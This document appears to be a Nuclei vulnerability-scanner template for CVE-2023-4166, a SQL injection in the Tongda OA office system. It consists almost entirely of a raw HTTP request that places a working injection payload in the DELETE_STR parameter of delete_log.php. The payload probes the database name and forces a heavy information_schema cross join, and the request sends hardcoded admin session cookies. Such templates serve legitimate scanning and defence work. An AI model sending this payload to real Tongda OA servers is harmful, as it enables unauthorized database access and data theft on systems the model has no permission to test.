id: tongdaOA-sql-CVE-2023-4166

info:
  name: 通达OA sql注入漏洞 CVE-2023-4166
  author: cnaq
  severity: high  
  description: 通达OA sql注入漏洞 CVE-2023-4166
  reference: https://github.com/wy876/POC/blob/main/%E9%80%9A%E8%BE%BEOA%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2023-4166.md
  tags: tongdaOA,sql,injection

requests:
  - raw:
      - |
        GET /general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))>char(1)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Cookie: PHPSESSID=4n867pmrrp4nendg0tsngl7g70; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c74d7ebb
        Connection: close

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - 'server'
          - 'guid'